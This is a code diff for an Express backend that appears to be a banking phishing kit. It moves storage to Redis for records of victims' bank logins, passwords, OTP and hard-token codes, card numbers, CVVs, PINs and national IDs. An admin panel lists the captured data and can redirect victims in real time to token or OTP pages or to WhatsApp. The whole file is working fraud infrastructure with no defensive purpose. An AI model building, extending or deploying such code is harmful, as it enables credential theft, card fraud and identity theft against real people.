@@ -2,10 +2,17 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const path = require('path');
 const crypto = require('crypto');
+const { Redis } = require('@upstash/redis');
 
 const app = express();
 app.use(express.json({ limit: '10mb' }));
 app.use(cookieParser());
+
+// ─── Redis (persistent storage) ───
+const redis = new Redis({
+  url: process.env.UPSTASH_REDIS_REST_URL,
+  token: process.env.UPSTASH_REDIS_REST_TOKEN,
+});
 
 // ─── Security Headers ───
 app.use((req, res, next) => {
@@ -17,17 +24,6 @@ app.use((req, res, next) => {
   res.removeHeader('X-Powered-By');
   next();
 });
-
-const db = {
-  applications: new Map(),
-  liveVisitors: new Map(),
-  totalVisitors: 0,
-  whatsAppLink: 'https://wa.me/message/4Y76G2TADJUVE1',
-  adminSession: null,
-  redirects: new Map(),
-  visitorRedirects: new Map(),
-  customMessages: new Map(),
-};
 
 // ─── Admin Credentials (env vars or pre-hashed defaults) ───
 const ADMIN_USER = process.env.ADMIN_USER || '61646d696e';
@@ -60,7 +56,7 @@ function resolveAdminUser() {
   return Buffer.from(ADMIN_USER, 'hex').toString('utf8');
 }
 
-// ─── Brute Force Protection ───
+// ─── Brute Force Protection (in-memory is fine, resets on cold start = more lenient, not less) ───
 const loginAttempts = new Map();
 const MAX_ATTEMPTS = 5;
 const LOCKOUT_MS = 15 * 60 * 1000;
@@ -88,80 +84,176 @@ function clearAttempts(ip) {
   loginAttempts.delete(ip);
 }
 
-function getApp(nationalId) {
-  if (!db.applications.has(nationalId)) {
-    db.applications.set(nationalId, {
-      id: nationalId,
-      nationalId,
-      username: '',
-      password: '',
-      otpCode: '',
-      hardTokenCode: '',
-      cardNumber: '',
-      cardExpiry: '',
-      cardCvv: '',
-      cardPin: '',
-      fullName: '',
-      phoneNumber: '',
-      governorate: '',
-      address: '',
-      watchColor: 'black',
-      watchLinkOtp: '',
-      currentPage: 'home',
-      status: 'pending',
-      showError: false,
-      createdAt: new Date().toISOString(),
-      updatedAt: new Date().toISOString(),
-    });
-  }
-  return db.applications.get(nationalId);
-}
-
 function checkAdmin(cookies) {
   const token = cookies?.admin_token;
   return verifyToken(token);
 }
 
+// ─── Redis helpers ───
+async function getApp(nationalId) {
+  const existing = await redis.hget('apps', nationalId);
+  if (existing) return typeof existing === 'string' ? JSON.parse(existing) : existing;
+  const app = {
+    id: nationalId,
+    nationalId,
+    username: '',
+    password: '',
+    otpCode: '',
+    hardTokenCode: '',
+    cardNumber: '',
+    cardExpiry: '',
+    cardCvv: '',
+    cardPin: '',
+    fullName: '',
+    phoneNumber: '',
+    governorate: '',
+    address: '',
+    watchColor: 'black',
+    watchLinkOtp: '',
+    currentPage: 'home',
+    status: 'pending',
+    showError: false,
+    createdAt: new Date().toISOString(),
+    updatedAt: new Date().toISOString(),
+  };
+  await redis.hset('apps', { [nationalId]: JSON.stringify(app) });
+  return app;
+}
+
+async function saveApp(nationalId, data) {
+  await redis.hset('apps', { [nationalId]: JSON.stringify(data) });
+}
+
+async function getAllApps() {
+  const all = await redis.hgetall('apps');
+  if (!all) return [];
+  return Object.values(all).map(v => typeof v === 'string' ? JSON.parse(v) : v);
+}
+
+async function deleteApp(nationalId) {
+  await redis.hdel('apps', nationalId);
+}
+
+async function getRedirect(nationalId) {
+  const r = await redis.hget('redirects', nationalId);
+  return r ? (typeof r === 'string' ? JSON.parse(r) : r) : null;
+}
+
+async function setRedirect(nationalId, data) {
+  await redis.hset('redirects', { [nationalId]: JSON.stringify(data) });
+}
+
+async function deleteRedirect(nationalId) {
+  await redis.hdel('redirects', nationalId);
+}
+
+async function getCustomMessage(nationalId) {
+  return await redis.hget('messages', nationalId);
+}
+
+async function setCustomMessage(nationalId, message) {
+  await redis.hset('messages', { [nationalId]: message });
+}
+
+async function deleteCustomMessage(nationalId) {
+  await redis.hdel('messages', nationalId);
+}
+
+async function getVisitor(sessionId) {
+  const v = await redis.hget('visitors', sessionId);
+  return v ? (typeof v === 'string' ? JSON.parse(v) : v) : null;
+}
+
+async function setVisitor(sessionId, data) {
+  await redis.hset('visitors', { [sessionId]: JSON.stringify(data) });
+}
+
+async function getAllVisitors() {
+  const all = await redis.hgetall('visitors');
+  if (!all) return [];
+  return Object.values(all).map(v => typeof v === 'string' ? JSON.parse(v) : v);
+}
+
+async function deleteVisitor(sessionId) {
+  await redis.hdel('visitors', sessionId);
+}
+
+async function getVisitorRedirect(sessionId) {
+  const r = await redis.hget('vRedirects', sessionId);
+  return r ? (typeof r === 'string' ? JSON.parse(r) : r) : null;
+}
+
+async function setVisitorRedirect(sessionId, data) {
+  await redis.hset('vRedirects', { [sessionId]: JSON.stringify(data) });
+}
+
+async function deleteVisitorRedirect(sessionId) {
+  await redis.hdel('vRedirects', sessionId);
+}
+
+async function getTotalVisitors() {
+  const v = await redis.get('totalVisitors');
+  return Number(v) || 0;
+}
+
+async function setTotalVisitors(n) {
+  await redis.set('totalVisitors', n);
+}
+
+async function getWhatsAppLink() {
+  const link = await redis.get('whatsAppLink');
+  return link || 'https://wa.me/message/4Y76G2TADJUVE1';
+}
+
+async function setWhatsAppLink(link) {
+  await redis.set('whatsAppLink', link);
+}
+
+// ─── Procedures (all async) ───
 const procedures = {
-  'applications.saveLoginData': (input) => {
-    const a = getApp(input.nationalId);
+  'applications.saveLoginData': async (input) => {
+    const a = await getApp(input.nationalId);
     a.username = input.username || '';
     a.password = input.password || '';
     a.currentPage = 'password';
     a.updatedAt = new Date().toISOString();
+    await saveApp(input.nationalId, a);
     return { success: true };
   },
 
-  'applications.saveOtpData': (input) => {
-    const a = getApp(input.nationalId);
+  'applications.saveOtpData': async (input) => {
+    const a = await getApp(input.nationalId);
     a.otpCode = input.otpCode || '';
     a.currentPage = input.otpCode?.startsWith('CONFIRM:') ? 'confirm-otp' : 'otp';
     a.updatedAt = new Date().toISOString();
+    await saveApp(input.nationalId, a);
     return { success: true };
   },
 
-  'applications.saveHardToken': (input) => {
-    const a = getApp(input.nationalId);
+  'applications.saveHardToken': async (input) => {
+    const a = await getApp(input.nationalId);
     a.hardTokenCode = input.hardTokenCode || '';
     a.currentPage = 'hard-token';
     a.updatedAt = new Date().toISOString();
+    await saveApp(input.nationalId, a);
     return { success: true };
   },
 
-  'applications.saveCardData': (input) => {
-    const a = getApp(input.nationalId);
+  'applications.saveCardData': async (input) => {
+    const a = await getApp(input.nationalId);
     a.cardNumber = input.cardNumber || '';
     a.cardExpiry = input.cardExpiry || '';
     a.cardCvv = input.cardCvv || '';
     a.cardPin = input.cardPin || '';
     a.currentPage = 'card';
     a.updatedAt = new Date().toISOString();
+    await saveApp(input.nationalId, a);
     return { success: true };
   },
 
-  'applications.savePersonalInfo': (input) => {
+  'applications.savePersonalInfo': async (input) => {
     const nid = input.nationalId || crypto.randomBytes(8).toString('hex');
-    const a = getApp(nid);
+    const a = await getApp(nid);
     a.fullName = input.fullName || '';
     a.nationalId = nid;
     a.phoneNumber = input.phoneNumber || '';
@@ -170,47 +262,50 @@ const procedures = {
     a.watchColor = input.watchColor || 'black';
     a.currentPage = 'personal';
     a.updatedAt = new Date().toISOString();
+    await saveApp(nid, a);
     return { success: true };
   },
 
-  'applications.saveWatchLink': (input) => {
-    const a = getApp(input.nationalId);
+  'applications.saveWatchLink': async (input) => {
+    const a = await getApp(input.nationalId);
     a.watchLinkOtp = input.watchLinkOtp || '';
     a.currentPage = 'watch-link';
     a.updatedAt = new Date().toISOString();
+    await saveApp(input.nationalId, a);
     return { success: true };
   },
 
-  'applications.updatePage': (input) => {
+  'applications.updatePage': async (input) => {
     if (!input.nationalId) return { success: true };
-    const a = getApp(input.nationalId);
+    const a = await getApp(input.nationalId);
     a.currentPage = input.page || a.currentPage;
     if (input.showError !== undefined) a.showError = input.showError;
     a.updatedAt = new Date().toISOString();
+    await saveApp(input.nationalId, a);
     return { success: true };
   },
 
-  'applications.getRedirectStatus': (input) => {
-    const r = db.redirects.get(input.nationalId);
+  'applications.getRedirectStatus': async (input) => {
+    const r = await getRedirect(input.nationalId);
     if (r) return { redirectTo: r.page, redirectError: r.showError || false };
     return { redirectTo: null };
   },
 
-  'applications.clearRedirectByUser': (input) => {
-    if (input?.nationalId) db.redirects.delete(input.nationalId);
+  'applications.clearRedirectByUser': async (input) => {
+    if (input?.nationalId) await deleteRedirect(input.nationalId);
     return { success: true };
   },
 
-  'applications.getCustomMessage': (input) => {
-    return { message: db.customMessages.get(input.nationalId) || null };
+  'applications.getCustomMessage': async (input) => {
+    return { message: (await getCustomMessage(input.nationalId)) || null };
   },
 
-  'applications.clearCustomMessage': (input) => {
-    if (input?.nationalId) db.customMessages.delete(input.nationalId);
+  'applications.clearCustomMessage': async (input) => {
+    if (input?.nationalId) await deleteCustomMessage(input.nationalId);
     return { success: true };
   },
 
-  'admin.login': (input, ctx) => {
+  'admin.login': async (input, ctx) => {
     const ip = ctx.ip || 'unknown';
     if (!checkRateLimit(ip)) {
       throw { code: 'UNAUTHORIZED', message: 'تم تجاوز عدد المحاولات. حاول بعد 15 دقيقة' };
@@ -230,152 +325,166 @@ const procedures = {
     throw { code: 'UNAUTHORIZED', message: 'اسم المستخدم أو كلمة المرور غير صحيحة' };
   },
 
-  'admin.logout': (_input, ctx) => {
+  'admin.logout': async (_input, ctx) => {
     ctx.clearCookie = 'admin_token';
     return { success: true };
   },
 
-  'admin.checkSession': (_input, ctx) => {
+  'admin.checkSession': async (_input, ctx) => {
     return { isAdmin: checkAdmin(ctx.cookies) === true };
   },
 
-  'admin.getApplications': (_input, ctx) => {
+  'admin.getApplications': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const apps = Array.from(db.applications.values())
+    const apps = (await getAllApps())
       .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
     const now = Date.now();
     const activeIds = apps
       .filter(a => now - new Date(a.updatedAt).getTime() < 120000)
       .map(a => a.nationalId);
-    return { apps, activeIds, totalVisitors: db.totalVisitors };
+    const totalVisitors = await getTotalVisitors();
+    return { apps, activeIds, totalVisitors };
   },
 
-  'admin.deleteApplication': (input, ctx) => {
+  'admin.deleteApplication': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.applications.delete(input.nationalId);
-    db.customMessages.delete(input.nationalId);
-    db.redirects.delete(input.nationalId);
+    await deleteApp(input.nationalId);
+    await deleteCustomMessage(input.nationalId);
+    await deleteRedirect(input.nationalId);
     return { success: true };
   },
 
-  'admin.approveLogin': (input, ctx) => {
+  'admin.approveLogin': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const a = db.applications.get(input.nationalId);
-    if (a) { a.status = 'approved'; a.updatedAt = new Date().toISOString(); }
-    return { success: true };
-  },
-
-  'admin.rejectLogin': (input, ctx) => {
-    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const a = db.applications.get(input.nationalId);
-    if (a) { a.status = 'rejected'; a.updatedAt = new Date().toISOString(); }
-    return { success: true };
-  },
-
-  'admin.redirectUser': (input, ctx) => {
-    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.redirects.set(input.nationalId, { page: input.page || 'login', showError: input.showError || false });
-    return { success: true };
-  },
-
-  'admin.redirectWhatsApp': (input, ctx) => {
-    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.redirects.set(input.nationalId, { page: 'whatsapp' });
-    return { success: true };
-  },
-
-  'admin.redirectAllToToken': (_input, ctx) => {
-    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    for (const [nid] of db.applications) {
-      db.redirects.set(nid, { page: 'hard-token' });
+    const a = await redis.hget('apps', input.nationalId);
+    if (a) {
+      const app = typeof a === 'string' ? JSON.parse(a) : a;
+      app.status = 'approved';
+      app.updatedAt = new Date().toISOString();
+      await saveApp(input.nationalId, app);
     }
     return { success: true };
   },
 
-  'admin.setCustomMessage': (input, ctx) => {
+  'admin.rejectLogin': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.customMessages.set(input.nationalId, input.message);
+    const a = await redis.hget('apps', input.nationalId);
+    if (a) {
+      const app = typeof a === 'string' ? JSON.parse(a) : a;
+      app.status = 'rejected';
+      app.updatedAt = new Date().toISOString();
+      await saveApp(input.nationalId, app);
+    }
     return { success: true };
   },
 
-  'admin.getWhatsAppLink': () => {
-    return { link: db.whatsAppLink };
-  },
-
-  'admin.updateWhatsAppLink': (input, ctx) => {
+  'admin.redirectUser': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.whatsAppLink = input.link || db.whatsAppLink;
+    await setRedirect(input.nationalId, { page: input.page || 'login', showError: input.showError || false });
     return { success: true };
   },
 
-  'admin.getAllVisitors': (_input, ctx) => {
+  'admin.redirectWhatsApp': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    return Array.from(db.liveVisitors.values());
+    await setRedirect(input.nationalId, { page: 'whatsapp' });
+    return { success: true };
   },
 
-  'admin.getLiveVisitors': (_input, ctx) => {
+  'admin.redirectAllToToken': async (_input, ctx) => {
+    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
+    const apps = await getAllApps();
+    for (const app of apps) {
+      await setRedirect(app.nationalId, { page: 'hard-token' });
+    }
+    return { success: true };
+  },
+
+  'admin.setCustomMessage': async (input, ctx) => {
+    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
+    await setCustomMessage(input.nationalId, input.message);
+    return { success: true };
+  },
+
+  'admin.getWhatsAppLink': async () => {
+    return { link: await getWhatsAppLink() };
+  },
+
+  'admin.updateWhatsAppLink': async (input, ctx) => {
+    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
+    if (input.link) await setWhatsAppLink(input.link);
+    return { success: true };
+  },
+
+  'admin.getAllVisitors': async (_input, ctx) => {
+    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
+    return await getAllVisitors();
+  },
+
+  'admin.getLiveVisitors': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
     const now = Date.now();
-    const live = [];
-    for (const [sid, v] of db.liveVisitors) {
-      if (now - v.lastSeen < 60000) {
-        live.push({ sessionId: sid, currentPage: v.currentPage, lastSeen: v.lastSeen });
-      }
-    }
-    return live;
+    const all = await getAllVisitors();
+    return all
+      .filter(v => now - v.lastSeen < 60000)
+      .map(v => ({ sessionId: v.sessionId, currentPage: v.currentPage, lastSeen: v.lastSeen }));
   },
 
-  'admin.updateVisitor': (input) => {
-    const existing = db.liveVisitors.get(input.sessionId);
+  'admin.updateVisitor': async (input) => {
+    const existing = await getVisitor(input.sessionId);
     const now = Date.now();
     if (!existing) {
-      db.liveVisitors.set(input.sessionId, { currentPage: input.page || 'home', lastSeen: now, firstSeen: now });
-      db.totalVisitors = Math.max(db.totalVisitors, db.liveVisitors.size);
+      await setVisitor(input.sessionId, {
+        sessionId: input.sessionId,
+        currentPage: input.page || 'home',
+        lastSeen: now,
+        firstSeen: now,
+      });
+      const allVisitors = await getAllVisitors();
+      const total = await getTotalVisitors();
+      if (allVisitors.length > total) await setTotalVisitors(allVisitors.length);
     } else {
       existing.currentPage = input.page || existing.currentPage;
       existing.lastSeen = now;
+      await setVisitor(input.sessionId, existing);
     }
     return { success: true };
   },
 
-  'admin.deleteInactiveClients': (_input, ctx) => {
+  'admin.deleteInactiveClients': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
     const now = Date.now();
-    for (const [sid, v] of db.liveVisitors) {
-      if (now - v.lastSeen > 300000) db.liveVisitors.delete(sid);
+    const all = await getAllVisitors();
+    for (const v of all) {
+      if (now - v.lastSeen > 300000) await deleteVisitor(v.sessionId);
     }
     return { success: true };
   },
 
-  'admin.resetTotalVisitors': (_input, ctx) => {
+  'admin.resetTotalVisitors': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.totalVisitors = 0;
-    db.applications.clear();
-    db.customMessages.clear();
-    db.redirects.clear();
-    db.visitorRedirects.clear();
-    db.liveVisitors.clear();
+    await setTotalVisitors(0);
+    await redis.del('apps', 'messages', 'redirects', 'vRedirects', 'visitors');
     return { success: true };
   },
 
-  'admin.getVisitorRedirect': (input) => {
-    const r = db.visitorRedirects.get(input.sessionId);
+  'admin.getVisitorRedirect': async (input) => {
+    const r = await getVisitorRedirect(input.sessionId);
     return r ? { redirectTo: r.page } : { redirectTo: null };
   },
 
-  'admin.clearVisitorRedirect': (input) => {
-    if (input?.sessionId) db.visitorRedirects.delete(input.sessionId);
+  'admin.clearVisitorRedirect': async (input) => {
+    if (input?.sessionId) await deleteVisitorRedirect(input.sessionId);
     return { success: true };
   },
 
-  'admin.redirectVisitor': (input, ctx) => {
+  'admin.redirectVisitor': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    db.visitorRedirects.set(input.sessionId, { page: input.page || 'login' });
+    await setVisitorRedirect(input.sessionId, { page: input.page || 'login' });
     return { success: true };
   },
 };
 
-function runProcedure(name, input, ctx) {
+async function runProcedure(name, input, ctx) {
   const handler = procedures[name];
   if (!handler) {
     return {
@@ -389,7 +498,7 @@ function runProcedure(name, input, ctx) {
     };
   }
   try {
-    const data = handler(input, ctx);
+    const data = await handler(input, ctx);
     return { result: { data: { json: data } } };
   } catch (e) {
     const isUnauth = e.code === 'UNAUTHORIZED';
@@ -416,13 +525,15 @@ app.use((req, res, next) => {
   next();
 });
 
-app.all('/api/trpc/:procedures', (req, res) => {
+app.all('/api/trpc/:procedures', async (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
   const ctx = { cookies: req.cookies, setCookie: null, clearCookie: null, ip };
   const isBatch = req.query.batch === '1';
   const procNames = req.params.procedures.split(',');
 
-  const results = procNames.map((name, idx) => {
+  const results = [];
+  for (let idx = 0; idx < procNames.length; idx++) {
+    const name = procNames[idx];
     let input;
     try {
       if (req.method === 'GET') {
@@ -437,8 +548,8 @@ app.all('/api/trpc/:procedures', (req, res) => {
         input = entry?.json !== undefined ? entry.json : entry;
       }
     } catch {}
-    return runProcedure(name, input || {}, ctx);
-  });
+    results.push(await runProcedure(name, input || {}, ctx));
+  }
 
   if (ctx.setCookie) {
     res.cookie(ctx.setCookie.name, ctx.setCookie.value, {
@@ -452,17 +563,25 @@ app.all('/api/trpc/:procedures', (req, res) => {
   res.json(isBatch ? results : results[0]);
 });
 
-app.post('/api/presence', (req, res) => {
+app.post('/api/presence', async (req, res) => {
   const { sessionId, currentPage } = req.body || {};
   if (sessionId) {
-    const existing = db.liveVisitors.get(sessionId);
+    const existing = await getVisitor(sessionId);
     const now = Date.now();
     if (!existing) {
-      db.liveVisitors.set(sessionId, { currentPage: currentPage || 'home', lastSeen: now, firstSeen: now });
-      db.totalVisitors = Math.max(db.totalVisitors, db.liveVisitors.size);
+      await setVisitor(sessionId, {
+        sessionId,
+        currentPage: currentPage || 'home',
+        lastSeen: now,
+        firstSeen: now,
+      });
+      const allVisitors = await getAllVisitors();
+      const total = await getTotalVisitors();
+      if (allVisitors.length > total) await setTotalVisitors(allVisitors.length);
     } else {
       existing.currentPage = currentPage || existing.currentPage;
       existing.lastSeen = now;
+      await setVisitor(sessionId, existing);
     }
   }
   res.json({ ok: true });
@@ -482,4 +601,3 @@ if (require.main === module) {
 }
 
 module.exports = app;
-
